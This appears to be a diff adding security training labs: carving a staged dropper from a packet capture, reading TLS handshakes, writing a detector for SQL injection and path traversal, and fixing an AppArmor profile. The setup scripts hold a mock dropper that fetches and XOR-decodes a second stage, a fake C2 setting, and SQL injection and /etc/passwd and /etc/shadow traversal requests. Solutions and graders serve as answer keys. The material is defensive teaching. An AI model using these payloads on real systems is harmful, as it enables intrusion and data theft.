+  title: Carve the dropper out of the HTTP stream
+  difficulty: 4
+  kind: build
+  tags: [pcap, tshark, http, malware, carving]
+  tutorial: |
+    **Concept.** Anything sent over plain HTTP can be recovered from a capture byte for byte, even when it was split across many TCP segments. Wireshark's export feature rebuilds the HTTP objects for you. Multi-stage droppers try to make that less useful: the first stage fetches the second, and the second is encoded so that it doesn't look like what it is. Each stage still has to be readable by the next one, so the keys and the decoding logic are in the capture too.
+
+    *Compression is not encryption.* A response with `Content-Encoding: gzip` is compressed for transport. The body must be decompressed before it means anything, and it is common for carving tools to give you the compressed form.
+
+    *XOR with a one-byte key* is one of the simplest obfuscations. It defeats a naive search for strings, and it is reversed by doing the same XOR again with the same key.
+
+    **Read up on:**
+    - `tshark --export-objects http,DIR`
+    - HTTP fields such as `http.request.uri`, `http.host`, `http.content_encoding`
+    - `file` to identify what you carved; `gunzip`, `zcat`
+    - reversing a XOR in a few lines of Python, for example `bytes(b ^ k for b in data)`
+  scenario: |
+    Host monitoring flagged a suspicious shell script that ran on a workstation. No files survive on disk, but the network team has **`/lab/drop.pcap`** from around that time.
+
+    Write your findings to **`/lab/report.txt`** as `key=value` lines.
+
+    ## Part 1: The first stage
+
+    A workstation fetched a shell script named **`update.sh`** over HTTP. Record:
+
+    - `victim`: the workstation's IP address
+    - `dropper_url`: the full URL it fetched, `http://HOST/PATH`, with no port if it was port 80
+
+    Save the script, **as plain readable text**, to **`/lab/stage1.sh`**.
+
+    ## Part 2: The second stage
+
+    The first stage fetched a second file and decoded it. Using what `stage1.sh` tells you, carve that second file from the capture and reverse its encoding.
+
+    Record:
+
+    - `stage2_url`: the URL of the second file, in the same format
+    - `xor_key`: the key the script uses, as a decimal number
+
+    Save the **decoded** bytes to **`/lab/stage2.bin`**.
+
+    ## Part 3: The implant's configuration
+
+    Work out what `stage2.bin` is and read it. Record:
+
+    - `c2`: the value of its `c2` setting, exactly as written
+
+    Save the flag it contains, by itself, to **`/lab/flag.txt`**.
+  hints:
+  - 'Part 1: filter HTTP requests for `update.sh` and read the source address, host header and URI.'
+  - 'Part 1: `--export-objects http` writes every object; check with `file` whether what you got needs decompressing.'
+  - 'Part 2: `stage1.sh` is short; read how it computes the key and which URL it fetches.'
+  - 'Part 2: XOR is its own inverse. Apply the key to every byte of the exported file.'
+  - 'Part 3: `file stage2.bin` will tell you the next step.'
+  solution: |
+    ```bash
+    cd /lab; mkdir -p /tmp/o
+    tshark -r drop.pcap -Y 'http.request.uri contains "update.sh"' -T fields -e ip.src -e http.host -e http.request.uri 2>/dev/null
+    tshark -r drop.pcap --export-objects http,/tmp/o >/dev/null 2>&1
+    file /tmp/o/*
+    # update.sh came over gzip: gunzip -c /tmp/o/update.sh >stage1.sh if it needs it
+    cat stage1.sh                      # shows K=... and the second URL
+    python3 -c "d=open('/tmp/o/cfg-XXXX.bin','rb').read();open('stage2.bin','wb').write(bytes(b^K for b in d))"
+    file stage2.bin; zcat stage2.bin | grep -E 'c2=|KL'
+    ```
+  setup: |
+    tshark_ready || { echo "tshark install failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s48
+    SRV=203.0.113.$((RANDOM%200+20)); VIC=10.50.0.$((RANDOM%3+21)); TAG=$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    KEY=$((RANDOM%250+3)); FLAG=$(rand_flag); C2=$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n').relay.evil.test:443
+    { echo "[implant]"; echo "c2=$C2"; echo "id=$TAG"; echo "flag=$FLAG"; for i in $(seq 1 400); do echo "pad$i=$(head -c30 /dev/urandom | od -An -tx1 | tr -d ' \n')"; done; } | gzip -9 >/srv/kl/s48/stage2
+    python3 -c "d=open('/srv/kl/s48/stage2','rb').read();open('/srv/kl/s48/cfg','wb').write(bytes(b^$KEY for b in d))"
+    cat >/srv/kl/s48/update.sh <<E
+    #!/bin/sh
+    # routine maintenance
+    K=$KEY
+    U=http://$SRV/static/cfg-$TAG.bin
+    curl -s "\$U" -o /tmp/.u
+    python3 -c "import sys;k=int(sys.argv[1]);p=sys.argv[2];d=open(p,'rb').read();open(p+'.dec','wb').write(bytes(b^k for b in d))" \$K /tmp/.u
+    E
+    cat >/srv/kl/s48/h.py <<'PY'
+    import gzip, os, sys
+    from http.server import BaseHTTPRequestHandler as B, ThreadingHTTPServer as S
+    tag = os.environ['TAG']
+    p1 = open('/srv/kl/s48/update.sh', 'rb').read()
+    p2 = open('/srv/kl/s48/cfg', 'rb').read()
+    class H(B):
+        protocol_version = 'HTTP/1.1'
+        def log_message(self, *a): pass
+        def do_GET(self):
+            if self.path == '/static/update.sh':
+                b = gzip.compress(p1); hdrs = [('Content-Type', 'text/x-shellscript'), ('Content-Encoding', 'gzip')]
+            elif self.path == f'/static/cfg-{tag}.bin':
+                b = p2; hdrs = [('Content-Type', 'application/octet-stream')]
+            else:
+                b = os.urandom(256).hex().encode(); hdrs = [('Content-Type', 'text/plain')]
+            self.send_response(200)
+            for k, v in hdrs: self.send_header(k, v)
+            self.send_header('Content-Length', str(len(b))); self.end_headers(); self.wfile.write(b)
+    S(('0.0.0.0', 80), H).serve_forever()
+    PY
+    lan_up srv=$SRV/24 cdn=198.51.100.7/24 w1=10.50.0.21/24 w2=10.50.0.22/24 w3=10.50.0.23/24
+    TAG=$TAG ip netns exec srv python3 /srv/kl/s48/h.py >/dev/null 2>&1 </dev/null &
+    TAG=$TAG ip netns exec cdn python3 /srv/kl/s48/h.py >/dev/null 2>&1 </dev/null &
+    eventually 10 "ip netns exec w1 curl -fsS -o /dev/null http://$SRV/x" || { echo "server did not start" >&2; exit 1; }
+    eventually 10 "ip netns exec w1 curl -fsS -o /dev/null http://198.51.100.7/x" || { echo "cdn did not start" >&2; exit 1; }
+    cap_start /lab/drop.pcap
+    for i in 1 2 3; do for p in /assets/app.js /assets/site.css /notes.txt; do ip netns exec w$i curl -s -o /dev/null http://198.51.100.7$p; done; done
+    VNS=w$((${VIC##*.}-20))
+    ip netns exec $VNS curl -s --compressed -o /dev/null http://$SRV/static/update.sh
+    sleep 1
+    ip netns exec $VNS curl -s -o /dev/null http://$SRV/static/cfg-$TAG.bin
+    sleep 1
+    cap_stop; lan_down
+    cat >"$KL_STATE/exp" <<E
+    VIC=$VIC
+    URL1=http://$SRV/static/update.sh
+    URL2=http://$SRV/static/cfg-$TAG.bin
+    KEY=$KEY
+    S1=$(sha256sum /srv/kl/s48/update.sh | cut -d' ' -f1)
+    S2=$(sha256sum /srv/kl/s48/stage2 | cut -d' ' -f1)
+    C2=$C2
+    FLAG=$FLAG
+    E
+    rm -rf /srv/kl/s48
+  check: |
+    . "$KL_STATE/exp"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    info "Part 1: The first stage"
+    check "victim is correct" '[ "$(f victim)" = "$VIC" ]'
+    check "dropper_url is correct" '[ "$(f dropper_url)" = "$URL1" ]'
+    check "/lab/stage1.sh is the decompressed script" '[ "$(sha256sum /lab/stage1.sh | cut -d" " -f1)" = "$S1" ]'
+    info "Part 2: The second stage"
+    check "stage2_url is correct" '[ "$(f stage2_url)" = "$URL2" ]'
+    check "xor_key is correct" '[ "$(f xor_key)" = "$KEY" ]'
+    check "/lab/stage2.bin is the decoded file" '[ "$(sha256sum /lab/stage2.bin | cut -d" " -f1)" = "$S2" ]'
+    info "Part 3: The implant's configuration"
+    check "c2 is correct" '[ "$(f c2)" = "$C2" ]'
+    check "the flag is correct" '[ "$(tr -d " \r\n" </lab/flag.txt)" = "$FLAG" ]'
+    kl_finish
+  solve: |
+    cd /lab
+    rm -rf /tmp/o; mkdir -p /tmp/o
+    tshark -r drop.pcap --export-objects http,/tmp/o >/dev/null 2>&1
+    read -r V H U < <(tshark -r drop.pcap -Y 'http.request.uri contains "update.sh"' -T fields -e ip.src -e http.host -e http.request.uri 2>/dev/null | head -1)
+    O=$(ls -d /tmp/o/* | grep -a 'update.sh' | head -1)
+    if file "$O" | grep -qi gzip; then gunzip -c <"$O" >stage1.sh; else cp "$O" stage1.sh; fi
+    K=$(sed -n 's/^K=//p' stage1.sh); U2=$(sed -n 's/^U=//p' stage1.sh)
+    B=$(ls -d /tmp/o/* | grep -a 'cfg-' | head -1)
+    python3 -c "d=open('$B','rb').read();open('stage2.bin','wb').write(bytes(b^$K for b in d))"
+    zcat stage2.bin >/tmp/stage2.txt
+    C2=$(sed -n 's/^c2=//p' /tmp/stage2.txt); sed -n 's/^flag=//p' /tmp/stage2.txt >flag.txt
+    printf 'victim=%s\ndropper_url=http://%s%s\nstage2_url=%s\nxor_key=%s\nc2=%s\n' "$V" "$H" "$U" "$U2" "$K" "$C2" >report.txt
+
+- id: sec-049
+  title: Read the TLS handshakes without decrypting
+  difficulty: 4
+  kind: build
+  tags: [pcap, tshark, tls, certificates, threat-hunting]
+  tutorial: |
+    **Concept.** Encryption hides what's inside a TLS session, but the setup has to be readable enough for two strangers to agree on keys. A defender can learn a lot from that setup without the keys.
+
+    *The ClientHello* is in plaintext. It carries the **SNI** (Server Name Indication), the hostname the client wants, so you can see which site a client asked for even though you can't see the traffic.
+
+    *The ServerHello* gives the chosen protocol version and cipher suite. Those show whether a session used modern encryption or something old.
+
+    *Certificates depend on the version.* In TLS 1.2 the server's certificate is sent in the clear, so its subject, issuer, validity and serial number can all be read straight from the capture. **TLS 1.3 encrypts the certificate**, so a passive observer can read only the SNI and the handshake parameters. Knowing which sessions reveal what is itself part of the analysis.
+
+    **Read up on:**
+    - `tls.handshake.type`: 1 = ClientHello, 2 = ServerHello, 11 = Certificate
+    - `tls.handshake.extensions_server_name`
+    - `tshark -G fields | grep -i x509` to find the certificate fields
+    - `-e tls.handshake.ciphersuite`, and how a suite such as `0x002f` maps to a name
+    - `-T fields` with a certificate frame, or `-V` to read the decoded tree
+  scenario: |
+    Security wants to know what an encrypted session reveals, using a capture the network team made during a workday. **`/lab/tls.pcap`** contains HTTPS from `10.60.0.21` to `10.60.0.24`. Approved services are in **`/lab/known-services.txt`**. Nothing in this lab needs the keys, and there aren't any.
+
+    Write your findings to **`/lab/report.txt`** as `key=value` lines.
+
+    ## Part 1: The unapproved service
+
+    One client connected to a host that isn't an approved service. Record:
+
+    - `suspect_client`: the client's IP address
+    - `server_ip`: the server it connected to
+    - `sni`: the server name it asked for
+
+    ## Part 2: The certificate
+
+    That server's certificate can be read in at least one of its sessions. Record:
+
+    - `cert_cn`: the certificate's subject Common Name
+    - `cert_issuer_cn`: the issuer's Common Name
+    - `cert_serial`: its serial number in hexadecimal, using only `0-9a-f` (no colons)
+    - `self_signed`: `yes` or `no`
+
+    ## Part 3: The weak session
+
+    One session used a key exchange with no forward secrecy, an RSA key exchange with a CBC cipher. Record:
+
+    - `weak_client`: which client
+    - `weak_cipher`: the cipher suite, as its IANA name or its hex value such as `0x002f`
+
+    ## Part 4: What was hidden
+
+    Record:
+
+    - `certs_visible`: how many sessions in the capture exposed a server certificate
+  hints:
+  - 'Part 1: list every ClientHello with its source, destination and SNI, then remove what is in the approved list.'
+  - 'Part 2: certificates appear in frames with `tls.handshake.type==11`. Run `tshark -G fields | grep -i x509` to find the names, or read one frame with `-V`.'
+  - 'Part 2: a certificate is self-signed when its subject and issuer match.'
+  - 'Part 3: list the ServerHello frames and look at the selected cipher suite.'
+  - 'Part 4: count the certificate messages, thinking about which TLS version sends one in the clear.'
+  solution: |
+    ```bash
+    cd /lab
+    tshark -r tls.pcap -Y 'tls.handshake.type==1' -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name 2>/dev/null | sort -u
+    tshark -r tls.pcap -Y 'tls.handshake.type==11' -V 2>/dev/null | grep -E 'Internet Protocol|Issuer|Subject|serialNumber|utf8String|printableString'
+    tshark -r tls.pcap -Y 'tls.handshake.type==2' -T fields -e ip.dst -e tls.handshake.version -e tls.handshake.ciphersuite 2>/dev/null
+    tshark -r tls.pcap -Y 'tls.handshake.type==11' 2>/dev/null | wc -l
+    ```
+
+    Fill `/lab/report.txt` from those.
+  setup: |
+    tshark_ready || { echo "tshark install failed" >&2; exit 1; }
+    mkdir -p /srv/kl/s49; cd /srv/kl/s49
+    BAD=203.0.113.$((RANDOM%200+20)); SUS=$((RANDOM%4+1)); WEAK=$(( (SUS%4)+1 ))
+    TAG=$(head -c3 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    SNI=svc-$TAG.cloud-sync.test; BADCN=relay-$TAG.cloud-sync.test
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout ca.key -out ca.crt -subj "/CN=Corp Internal CA" -days 365 >/dev/null 2>&1
+    for s in api cdn; do
+      openssl req -newkey rsa:2048 -nodes -keyout $s.key -out $s.csr -subj "/CN=$s.corp.test" >/dev/null 2>&1
+      openssl x509 -req -in $s.csr -CA ca.crt -CAkey ca.key -CAcreateserial -days 90 -out $s.crt >/dev/null 2>&1
+    done
+    SERIAL=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+    openssl req -x509 -newkey rsa:2048 -nodes -keyout bad.key -out bad.crt -subj "/CN=$BADCN" -days 30 -set_serial 0x$SERIAL >/dev/null 2>&1
+    lan_up api=10.60.0.10/24 cdn=10.60.0.11/24 bad=$BAD/24 c1=10.60.0.21/24 c2=10.60.0.22/24 c3=10.60.0.23/24 c4=10.60.0.24/24
+    for s in api cdn; do
+      ip netns exec $s openssl s_server -accept 443 -cert $s.crt -key $s.key -cipher 'ALL:@SECLEVEL=0' -www >/dev/null 2>&1 </dev/null &
+    done
+    ip netns exec bad openssl s_server -accept 443 -cert bad.crt -key bad.key -cipher 'ALL:@SECLEVEL=0' -www >/dev/null 2>&1 </dev/null &
+    eventually 10 "ip netns exec c1 bash -c 'echo | timeout 3 openssl s_client -connect 10.60.0.10:443 -brief 2>&1 | grep -qi protocol'" || { echo "tls did not start" >&2; exit 1; }
+    cat >/lab/known-services.txt <<E
+    api.corp.test 10.60.0.10
+    cdn.corp.test 10.60.0.11
+    E
+    chown "$(lab_user)": /lab/known-services.txt
+    conn() { # NS IP SNI ARGS...
+      local ns=$1 ip=$2 sni=$3; shift 3
+      ip netns exec "$ns" timeout 5 openssl s_client -connect "$ip:443" -servername "$sni" "$@" </dev/null >/dev/null 2>&1
+      sleep 0.1
+    }
+    cap_start /lab/tls.pcap
+    for round in 1 2; do
+      for i in 1 2 3 4; do
+        conn c$i 10.60.0.10 api.corp.test -tls1_3
+        conn c$i 10.60.0.11 cdn.corp.test -tls1_3
+      done
+    done
+    conn c1 10.60.0.10 api.corp.test -tls1_2
+    conn c2 10.60.0.11 cdn.corp.test -tls1_2
+    conn c$WEAK 10.60.0.10 api.corp.test -tls1_2 -cipher 'AES128-SHA:@SECLEVEL=0'
+    conn c$SUS $BAD $SNI -tls1_3
+    conn c$SUS $BAD $SNI -tls1_2
+    sleep 1
+    cap_stop; lan_down
+    NCERT=$(tshark -r /lab/tls.pcap -Y 'tls.handshake.type==11' 2>/dev/null | wc -l)
+    cat >"$KL_STATE/exp" <<E
+    SUS=10.60.0.2$SUS
+    BAD=$BAD
+    SNI=$SNI
+    BADCN=$BADCN
+    SERIAL=$SERIAL
+    WEAK=10.60.0.2$WEAK
+    NCERT=$NCERT
+    E
+    cd /; rm -rf /srv/kl/s49
+  check: |
+    . "$KL_STATE/exp"
+    f() { sed -n "s/^$1=//p" /lab/report.txt 2>/dev/null | head -1 | tr -d ' \r'; }
+    info "Part 1: The unapproved service"
+    check "suspect_client is correct" '[ "$(f suspect_client)" = "$SUS" ]'
+    check "server_ip is correct" '[ "$(f server_ip)" = "$BAD" ]'
+    check "sni is correct" '[ "$(f sni)" = "$SNI" ]'
+    info "Part 2: The certificate"
+    check "cert_cn is correct" '[ "$(f cert_cn)" = "$BADCN" ]'
+    check "cert_issuer_cn is correct" '[ "$(f cert_issuer_cn)" = "$BADCN" ]'
+    check "cert_serial is correct" '[ "$(f cert_serial | tr -d : | tr A-F a-f | sed "s/^0x//;s/^0*//")" = "$(echo "$SERIAL" | sed "s/^0*//")" ]'
+    check "self_signed is correct" '[ "$(f self_signed)" = yes ]'
+    info "Part 3: The weak session"
+    check "weak_client is correct" '[ "$(f weak_client)" = "$WEAK" ]'
+    check "weak_cipher is correct" 'c=$(f weak_cipher); [ "$c" = "0x002f" ] || [ "$c" = "TLS_RSA_WITH_AES_128_CBC_SHA" ]'
+    info "Part 4: What was hidden"
+    check "certs_visible is correct" '[ "$(f certs_visible)" = "$NCERT" ]'
+    kl_finish
+  solve: |
+    cd /lab
+    tshark -r tls.pcap -Y 'tls.handshake.type==1' -T fields -e ip.src -e ip.dst -e tls.handshake.extensions_server_name 2>/dev/null | sort -u >/tmp/hello
+    read -r S D N < <(grep -vFf <(awk '{print $1}' known-services.txt) /tmp/hello | head -1)
+    F=$(tshark -r tls.pcap -Y "tls.handshake.type==11 && ip.src==$D" -T fields -e frame.number 2>/dev/null | head -1)
+    tshark -r tls.pcap -Y "frame.number==$F" -V 2>/dev/null >/tmp/cert.txt
+    CN=$(grep -oE 'relay-[0-9a-f]+\.cloud-sync\.test' /tmp/cert.txt | head -1)
+    SER=$(tshark -r tls.pcap -Y "frame.number==$F" -T fields -e x509af.serialNumber 2>/dev/null | tr -d ': ' | tr A-F a-f | sed 's/^0x//')
+    WEAK=$(tshark -r tls.pcap -Y 'tls.handshake.type==2 && tls.handshake.ciphersuite==0x002f' -T fields -e ip.dst 2>/dev/null | head -1)
+    NC=$(tshark -r tls.pcap -Y 'tls.handshake.type==11' 2>/dev/null | wc -l)
+    printf 'suspect_client=%s\nserver_ip=%s\nsni=%s\ncert_cn=%s\ncert_issuer_cn=%s\ncert_serial=%s\nself_signed=yes\nweak_client=%s\nweak_cipher=0x002f\ncerts_visible=%s\n' \
+      "$S" "$D" "$N" "$CN" "$CN" "$SER" "$WEAK" "$NC" >report.txt
+
+- id: sec-050
+  title: Write a detection that catches the variant
+  difficulty: 4
+  kind: build
+  tags: [detection, logs, web, sqli, traversal]
+  tutorial: |
+    **Concept.** A detection is a promise that a class of behaviour will be noticed. The usual way to write a bad one is to copy the literal string from the incident: it alerts on yesterday's attack and on nothing else. Attackers change case, add comments, swap whitespace and encode their payloads, so a useful detection is built around what the attack has to *do*, and it is tested against variants and against normal traffic before anyone trusts it.
+
+    *Normalise before matching.* Compare the decoded and simplified form. URL-decoding (more than once, for double encoding), folding case, turning `+` and inline comments into spaces and collapsing whitespace gets most encoding tricks out of the way. Then a much simpler pattern works.
+
+    *Precision matters as much as recall.* A detection that fires on every search for "union station" gets muted. Real users do put apostrophes and words like "select" into forms, so the pattern has to look for structure (quote-and-boolean, `union ... select`) rather than single words.
+
+    **Read up on:**
+    - the nginx `combined` log format and where the request line sits
+    - `urllib.parse.unquote` (or `printf '%b'`-style decoding) and why you may need more than one pass
+    - SQL injection basics: `' OR 1=1 --`, `UNION SELECT`, time-based `SLEEP(...)`, `information_schema`
+    - directory traversal: `../`, `..%2f`, `%2e%2e%2f`, double encoding, and targets such as `/etc/passwd`
+  scenario: |
+    The file **`/lab/logs/access.log`** holds a day of real nginx traffic for a shop. Two sources in it are attacks: one is SQL injection and the other is directory traversal. Everything else in the file is normal traffic, including some innocent requests that look suspicious at a glance.
+
+    ## Part 1: The detection
+
+    Write an executable **`/lab/detect.sh`** that takes one argument, the path of an access log in this format, and prints the client IP address of every attacking source, **one per line, sorted and without duplicates**, with exit status 0. It must be written in any language and use only what's available on this VM.
+
+    Run against `/lab/logs/access.log` it must print exactly the attacking addresses.
+
+    ## Part 2: The variants
+
+    Your detection will be run against a log you can't see, containing other attacks from other addresses, and normal traffic that looks like them. Those attacks vary the payload in these ways, and it must catch each one:
+
+    - changing case: `UnIoN SeLeCt`
+    - inline comments in place of spaces: `union/**/select`
+    - URL encoding, including double encoding: `%27`, `%2527`, `%2e%2e%2f`, `%252e%252e%252f`
+    - spaces written as `+` or `%09`
+    - a time-based injection using `sleep(...)`
+
+    It must not report the normal traffic in that log, which includes requests such as a search for `union station`, a search for `O'Reilly`, a product called `select-pro`, and a search for `sleep apnea`.
+  hints:
+  - 'Part 1: read the log. What separates the attack requests from the normal ones that use the same words?'
+  - 'Part 1: pull the client IP (field 1) and the request (between the first pair of double quotes) out of each line.'
+  - 'Part 2: URL-decode in a loop until the string stops changing, then lowercase it and replace `/**/`, `+` and tabs with spaces.'
+  - 'Part 2: match structure such as `union` followed by `select`, a quote followed by `or` and a comparison, `sleep(`, `../` and `/etc/passwd`, rather than single words.'
+  solution: |
+    A Python version:
+
+    ```bash
+    cat >/lab/detect.sh <<'PY'
+    #!/usr/bin/env python3
+    import re, sys, urllib.parse as u
+    bad = re.compile(r"union\s+(all\s+)?select|'\s*or\b|\bor\s+\d+\s*=\s*\d+|sleep\(|benchmark\(|information_schema|\.\./|/etc/passwd")
+    ips = set()
+    for line in open(sys.argv[1], errors='replace'):
+        m = re.match(r'(\S+) .*?"\S+ (\S+)', line)
+        if not m: continue
+        s = m.group(2)
+        for _ in range(4):
+            d = u.unquote_plus(s)
+            if d == s: break
+            s = d
+        s = s.lower().replace('/**/', ' ')
+        s = re.sub(r'\s+', ' ', s)
+        if bad.search(s): ips.add(m.group(1))
+    for ip in sorted(ips): print(ip)
+    PY
+    chmod +x /lab/detect.sh
+    ```
+  setup: |
+    mkdir -p /srv/kl/s50/logs
+    cat >/srv/kl/s50/nginx.conf <<'CONF'
+    events {}
+    http {
+      set_real_ip_from 0.0.0.0/0;
+      real_ip_header X-Forwarded-For;
+      access_log /logs/access.log;
+      server { listen 80; location / { return 200 "ok\n"; } }
+    }
+    CONF
+    chmod -R a+rwX /srv/kl/s50
+    docker run -d --name kl-s50 -p 127.0.0.1:8050:80 \
+      -v /srv/kl/s50/nginx.conf:/etc/nginx/nginx.conf:ro -v /srv/kl/s50/logs:/logs nginx:1.27-alpine >/dev/null
+    on_reset 'docker rm -f kl-s50 >/dev/null 2>&1'
+    eventually 20 'curl -fsS -m2 -o /dev/null http://127.0.0.1:8050/' || { echo "nginx did not start" >&2; exit 1; }
+    req() { curl -s --path-as-is -g -o /dev/null -H "X-Forwarded-For: $1" -A "$3" "http://127.0.0.1:8050$2"; }
+    rip() { echo "$((RANDOM%190+11)).$((RANDOM%250+1)).$((RANDOM%250+1)).$((RANDOM%250+1))"; }
+    UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36'
+    normal() { # IP: ordinary browsing with some awkward-looking but innocent requests
+      local ip=$1
+      for p in / /shop /shop/product/select-pro /shop/cart "/search?q=union+station" "/search?q=O%27Reilly" \
+               "/search?q=rock+or+jazz" "/search?q=sleep+apnea" /static/app.js /static/style.css "/search?q=select+your+plan" \
+               "/shop/product/1.2.3-update" /account/orders; do
+        req "$ip" "$p" "$UA"
+      done
+    }
+    A1=$(rip); A2=$(rip)
+    for i in 1 2 3 4 5 6; do normal "$(rip)"; done
+    for i in 1 2 3 4; do req "$A1" "/shop/product?id=1%27%20OR%20%271%27=%271" sqlmap/1.8; req "$A1" "/shop/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users--" sqlmap/1.8; done
+    req "$A1" "/shop/product?id=1%27%20AND%20SLEEP(5)--" sqlmap/1.8
+    req "$A1" "/shop/product?id=1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables" sqlmap/1.8
+    for i in 1 2 3 4; do req "$A2" "/download?file=../../../../etc/passwd" curl/8.5; req "$A2" "/download?file=..%2f..%2f..%2fetc%2fshadow" curl/8.5; done
+    for i in 1 2 3; do normal "$(rip)"; done
+    sleep 1
+    mkdir -p /lab/logs; cp /srv/kl/s50/logs/access.log /lab/logs/access.log; chown -R "$(lab_user)": /lab/logs
+    # the log the learner can't see: new addresses, one per attack variant
+    : >/srv/kl/s50/logs/access.log
+    docker exec kl-s50 nginx -s reopen; sleep 1
+    V=$KL_STATE/variants; rm -f "$V"; mkdir -p "$KL_STATE"
+    vreq() { # NAME PATH
+      local ip; ip=$(rip); printf '%s %s\n' "$ip" "$1" >>"$V"
+      req "$ip" "$2" Mozilla/5.0
+    }
+    vreq "mixed case SQL" "/shop/product?id=1%20UnIoN%20SeLeCt%20user,pass%20FrOm%20users"
+    vreq "inline-comment SQL" "/shop/product?id=1/**/union/**/select/**/1,2,3"
+    vreq "URL-encoded quote" "/login?user=admin%27%20or%201=1--"
+    vreq "double-encoded quote" "/login?user=admin%2527%2520or%25201=1--"
+    vreq "plus for space" "/shop/product?id=1+union+all+select+1,2"
+    vreq "tab for space" "/shop/product?id=1%09union%09select%091,2"
+    vreq "time-based injection" "/shop/product?id=1%27%20and%20sleep(5)--"
+    vreq "encoded traversal" "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    vreq "double-encoded traversal" "/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
+    for i in 1 2 3 4 5; do normal "$(rip)"; done
+    sleep 1
+    cp /srv/kl/s50/logs/access.log "$KL_STATE/hidden.log"
+    docker rm -f kl-s50 >/dev/null
+    chmod 600 "$KL_STATE/hidden.log" "$V"
+    printf '%s\n%s\n' "$A1" "$A2" | sort >"$KL_STATE/known"
+    rm -rf /srv/kl/s50
+  check: |
+    run() { sudo -u "$(lab_user)" timeout 20 /lab/detect.sh "$1"; }
+    info "Part 1: The detection"
+    if [ -x /lab/detect.sh ]; then pass "/lab/detect.sh exists and is executable"; else fail "/lab/detect.sh exists and is executable"; fi
+    O1=$(run /lab/logs/access.log 2>/dev/null); RC1=$?
+    check "it exits 0 on the access log" '[ "$RC1" = 0 ]'
+    check "it prints exactly the two attacking addresses" '[ "$O1" = "$(cat $KL_STATE/known)" ]'
+    info "Part 2: The variants"
+    H=$(mktemp -p /tmp); cp "$KL_STATE/hidden.log" "$H"; chmod 644 "$H"
+    O2=$(run "$H" 2>/dev/null); rm -f "$H"
+    if [ -x /lab/detect.sh ]; then
+      while read -r ip name; do
+        if grep -qx "$ip" <<<"$O2"; then pass "caught: $name"; else fail "missed: $name"; fi
+      done <"$KL_STATE/variants"
+      EXTRA=$(comm -23 <(sort -u <<<"$O2") <(cut -d' ' -f1 "$KL_STATE/variants" | sort -u) | grep -c .)
+      check "no normal traffic reported" '[ "$EXTRA" = 0 ]'
+    else
+      fail "the detection handles the hidden log"
+    fi
+    kl_finish
+  solve: |
+    cat >/lab/detect.sh <<'PY'
+    #!/usr/bin/env python3
+    import re, sys, urllib.parse as u
+    bad = re.compile(r"union\s+(all\s+)?select|'\s*or\b|\bor\s+\d+\s*=\s*\d+|sleep\(|benchmark\(|information_schema|\.\./|/etc/passwd")
+    ips = set()
+    for line in open(sys.argv[1], errors='replace'):
+        m = re.match(r'(\S+) .*?"\S+ (\S+)', line)
+        if not m:
+            continue
+        s = m.group(2)
+        for _ in range(4):
+            d = u.unquote_plus(s)
+            if d == s:
+                break
+            s = d
+        s = s.lower().replace('/**/', ' ')
+        s = re.sub(r'\s+', ' ', s)
+        if bad.search(s):
+            ips.add(m.group(1))
+    for ip in sorted(ips):
+        print(ip)
+    PY
+    chmod +x /lab/detect.sh
+
+- id: sec-051
+  title: A permission denied that isn't about permissions
+  difficulty: 3
+  kind: fix
+  tags: [apparmor, mac, hardening, troubleshooting]
+  tutorial: |
+    **Concept.** AppArmor is a mandatory access control layer: a profile lists what a program may touch, and the kernel refuses anything else, even when the ordinary Unix permissions would allow it. So a program can fail with "Permission denied" on a file its user can read. The usual reaction is to `chmod` the file, and that does nothing, because the file permissions were never the problem.
+
+    *The log is the answer.* Every refusal is written to the kernel log with `apparmor="DENIED"`. The message says which `operation` was attempted, which `name` it was on, and what mask was wanted. A profile is fixed one denial at a time.
+
+    *Least privilege is still the goal.* Disabling the profile or adding `/** rwx` makes the error stop and removes the protection. The right change is the narrowest rule that allows what the service actually needs.
+
+    **Read up on:**
+    - `sudo journalctl -k` or `sudo dmesg`, and reading `apparmor="DENIED"` lines: `operation`, `name`, `requested_mask`, `denied_mask`
+    - `aa-status` and the modes `enforce` and `complain`
+    - profile syntax: file rules such as `/etc/app/** r,`, modes `r`, `w`, `a`, `k`, `m`, `ix`; and `network inet stream,`
+    - `sudo apparmor_parser -r /etc/apparmor.d/PROFILE` to reload after an edit
+    - `aa-exec -p PROFILE -- COMMAND` to test a profile from the shell
+  scenario: |
+    The service **`kl-report`** (a small Python program at `/opt/kl-report/app.py`, run as root by systemd) won't start. It reads its config, writes a report, and serves a status page on `127.0.0.1:9190`. The file permissions all look right. The service is confined by the AppArmor profile **`kl-report`** in `/etc/apparmor.d/kl-report`.
+
+    ## Part 1: Find out why
+
+    Use the kernel log to find each thing the profile stopped. The service fails at the first denial, so you'll see them one at a time as you fix them. A crashing Python program also triggers some denied reads from its crash reporter (`/etc/default/apport`, `/usr/share/dpkg/...` and similar): the service doesn't need those, so don't add rules for them. Write each denied item the service actually needs to **`/lab/denials.txt`**, one per line:
+
+    - for files, the full path that was denied
+    - for networking, the word `network` followed by the family and socket type shown in the log, such as `network inet stream`
+
+    ## Part 2: Fix the profile
+
+    Edit `/etc/apparmor.d/kl-report` until the service runs. Reload the profile and restart the service as you go. The status page at `http://127.0.0.1:9190/status` must answer.
+
+    ## Part 3: Keep it locked down
+
+    The profile must stay in **enforce** mode and must still protect everything else. The service has no business reading **`/etc/kl-report/secret.key`** or writing anywhere under **`/etc/kl-report`**, and those must stay denied. Use specific rules for what the service needs: a rule covering the whole filesystem such as `/** r` is not acceptable. Don't change the file permissions, the unit file or the program.
+  hints:
+  - 'Part 1: `sudo systemctl status kl-report` shows the Python error, then `sudo journalctl -k | grep DENIED | tail` shows why.'
+  - 'Part 1: networking denials say `family="inet" sock_type="stream"`.'
